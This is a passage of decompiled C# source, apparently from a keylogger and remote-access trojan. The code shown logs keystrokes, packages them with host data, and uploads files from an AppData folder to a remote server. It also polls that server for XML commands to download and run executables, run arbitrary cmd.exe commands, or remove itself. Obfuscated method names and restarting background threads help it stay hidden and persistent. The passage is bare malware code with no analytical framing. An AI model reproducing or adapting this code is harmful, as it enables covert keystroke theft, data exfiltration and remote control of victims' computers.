		{
			exiting();
		});
		Application.Run();
	}

	public static void wdfegrbfvdcsqcwefvbgrvfdcwefvfvrdcewfevr()
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		if (!curHost.efffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff())
		{
			act.csefvgrhtyjuioppooiouiyygrhgfdfgbfvdfnhgbfvvfyjtbgrefvntjmtnhbegvfwnhfvdcbgrtnhhbgfvdc();
		}
		t1.IsBackground = true;
		t1.Name = Conversions.ToString(Operators.ConcatenateObject((object)"backgrouThread", controlState.RandomString(10)));
		t1.Start();
		t2.IsBackground = true;
		t2.Name = Conversions.ToString(Operators.ConcatenateObject((object)"uploader", controlState.RandomString(10)));
		t2.Start();
		tm = new Timer();
		tm.add_Tick((EventHandler)delegate
		{
			dsgvrtgvhbtygrecfgrvhbynjtbgvrfcgvrhnyjbgvfgrnyjmbgvfghnyjnbtgvfbgtnyjmunybgvfrbtnyjubgvcevrbtnyjumyjbgvfnyjbgvrbtnyjubtgvrfrbthgvrfcefgvrbthy();
		});
		tm.set_Interval(Conversions.ToInteger(controlState.wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww));
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void processXml(XElement xml)
	{
		try
		{
			if (Information.IsNothing((object)xml))
			{
				return;
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("download")).Any())
			{
				networkDownload networkDownload = new networkDownload();
				foreach (XElement item in ((XContainer)xml).Descendants(XName.op_Implicit("download")))
				{
					try
					{
						if (!networkDownload.downloadFileExe(item.get_Value(), item.Attribute(XName.op_Implicit("com")).get_Value()))
						{
							networkDownload.downloadFileExe(item.get_Value(), item.Attribute(XName.op_Implicit("com")).get_Value());
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("com")).Any())
			{
				foreach (XElement item2 in ((XContainer)xml).Descendants(XName.op_Implicit("com")))
				{
					try
					{
						Process.Start("cmd.exe", item2.get_Value());
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("suicide")).Any())
			{
				act.suicide();
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void makeFinaData()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		XElement val = keylog.rotate();
		if (!Information.IsNothing((object)val))
		{
			XElement val2 = new XElement(XName.op_Implicit("blackBox"));
			((XContainer)val2).Add((object)val);
			((XContainer)val2).Add((object)curHost.getData());
			new secure().prepareForUpload(val2);
		}
	}

	private static void aefgrhyjkuiluthergtvbhyjutgrgcthyjuyjhtgrfgthyjuyhgcfgrthjhygrfcrgtvhbynjybgvrcfgvrhyjnbhgvd()
	{
		long num = controlState.getTimeStamp() + controlState.dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd;
		while (true)
		{
			Type typeFromHandle = typeof(Thread);
			object[] obj = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
			object[] array = obj;
			bool[] obj2 = new bool[1] { true };
			bool[] array2 = obj2;
			NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", obj, (string[])null, (Type[])null, obj2, true);
			if (array2[0])
			{
				controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
			}
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(" data 000000000 " + Conversions.ToString(keylog.countElement()));
			if (Operators.ConditionalCompareObjectGreater((object)keylog.keySize(), controlState.ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt, false))
			{
				makeFinaData();
				num = controlState.getTimeStamp() + controlState.dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd;
				Type typeFromHandle2 = typeof(Thread);
				object[] obj3 = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
				array = obj3;
				bool[] obj4 = new bool[1] { true };
				array2 = obj4;
				NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", obj3, (string[])null, (Type[])null, obj4, true);
				if (array2[0])
				{
					controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
			else if (num <= controlState.getTimeStamp())
			{
				if (keylog.countElement() > 1)
				{
					keylog.timeout();
					makeFinaData();
				}
				else
				{
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("timeout, no data " + Conversions.ToString(keylog.countElement()));
				}
				num = controlState.getTimeStamp() + controlState.dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd;
				NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", array = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
				if (array2[0])
				{
					controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
			NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", array = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
			}
			bool con = conState.isHostConnected();
			keylog.con = con;
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("check net = " + con);
			NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", array = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
			if (array2[0])
			{
				controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
			}
			act.scbgfyjgnhvdxwfgvrnyjmubgvcdfgvrhyjutrhyuiopuytyuioerwytyurhytvhtgvtrrbretreggrec();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void svdgrhtnyjtgrfvcfvbgrhtyjujtgrfvdcdvgbhnyjujhgfvdsbgfnhyjkuyjtgfvdgvhnyjuynhgfvscvrgtbhbfcvrbtynbgtfvrcvrbtnyvrf()
	{
		if (args.Count() > 1 && args.Contains("-h"))
		{
			string text = "";
			int num = Array.IndexOf(args, "-h") + 1;
			int num2 = args.Count() - Array.IndexOf(args, "-h");
			for (int i = num; i <= num2; i++)
			{
				text = text + args.ElementAt(i) + " ";
			}
			try
			{
				Process.Start(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999300");
				ProjectData.ClearProjectError();
			}
			if (!curHost.efffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff())
			{
				act.csefvgrhtyjuioppooiouiyygrhgfdfgbfvdfnhgbfvvfyjtbgrefvntjmtnhbegvfwnhfvdcbgrtnhhbgfvdc();
			}
			ProjectData.EndApp();
		}
	}

	public static void dfwegrhtyjukjtgrfvgthyjgfvevgrhtnyjtgredcwfgrhyjtgrecfgrthyjnfvscdfvbgrhnyjtfvdcfvgrbthfvewdcfevrgtbhgre()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name();
		networkUpload networkUpload = new networkUpload();
		networkDownload networkDownload = new networkDownload();
		keylog.bufferInit(background: true);
		while (true)
		{
			Thread.Sleep((int)Math.Round((double)controlState.dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd / 2.0));
			if (!conState.isHostConnected())
			{
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("offline");
				continue;
			}
			try
			{
				if (Operators.ConditionalCompareObjectEqual(controlState.writingBusy, (object)false, false))
				{
					conState.balance();
					string[] files = Directory.GetFiles(path, "*.dll");
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("file to be uploaded -: " + Conversions.ToString(files.Count()));
					networkUpload.discard = false;
					Type typeFromHandle = typeof(Thread);
					object[] obj = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
					object[] array = obj;
					bool[] obj2 = new bool[1] { true };
					bool[] array2 = obj2;
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", obj, (string[])null, (Type[])null, obj2, true);
					if (array2[0])
					{
						controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
					}
					string[] array3 = files;
					foreach (string text in array3)
					{
						try
						{
							actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(Conversions.ToString(Path.GetFileName(text)!.Length) + "  fffffffff");
							if (Path.GetFileName(text)!.Length == 24)
							{
								if (networkUpload.discard)
								{
									break;
								}
								networkUpload.upload(text);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", array = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
						if (array2[0])
						{
							controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
						}
					}
				}
				else if (Conversions.ToBoolean(controlState.debug))
				{
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("busy");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				if (Conversions.ToBoolean(controlState.debug))
				{
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x0000032  ");
				}
				ProjectData.ClearProjectError();
			}
			try
			{
				processXml(networkDownload.downloadString());
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void dsgvrtgvhbtygrecfgrvhbynjtbgvrfcgvrhnyjbgvfgrnyjmbgvfghnyjnbtgvfbgtnyjmunybgvfrbtnyjubgvcevrbtnyjumyjbgvfnyjbgvrbtnyjubtgvrfrbthgvrfcefgvrbthy()
	{
		try
		{
			if (!t1.IsAlive)
			{
				t1.IsBackground = true;
				t1.Name = Conversions.ToString(Operators.ConcatenateObject((object)"backgrouThread", controlState.RandomString(10)));
				t1.Start();
			}
			else
			{
				Console.Write("numb one running");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999400");
			Thread thread = new Thread(aefgrhyjkuiluthergtvbhyjutgrgcthyjuyjhtgrfgthyjuyhgcfgrthjhygrfcrgtvhbynjybgvrcfgvrhyjnbhgvd);
			thread.IsBackground = true;
			thread.Name = Conversions.ToString(Operators.ConcatenateObject((object)"backgrouThread", controlState.RandomString(10)));
			thread.Start();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!t2.IsAlive)
			{
				t2.IsBackground = true;
				t2.Name = Conversions.ToString(Operators.ConcatenateObject((object)"backgrouThread", controlState.RandomString(10)));
				t2.Start();
			}
			else
			{
				Console.Write("numb two running");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999500");
			Thread thread2 = new Thread(aefgrhyjkuiluthergtvbhyjutgrgcthyjuyjhtgrfgthyjuyhgcfgrthjhygrfcrgtvhbynjybgvrcfgvrhyjnbhgvd);
			thread2.IsBackground = true;
			thread2.Name = Conversions.ToString(Operators.ConcatenateObject((object)"backgrouThread", controlState.RandomString(10)));
			thread2.Start();
			ProjectData.ClearProjectError();
		}
	}

	private static void exiting()
	{
		if (Operators.ConditionalCompareObjectEqual(controlState.debug, (object)false, false))
		{
			makeFinaData();
		}
		actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("closing ********");
	}
}
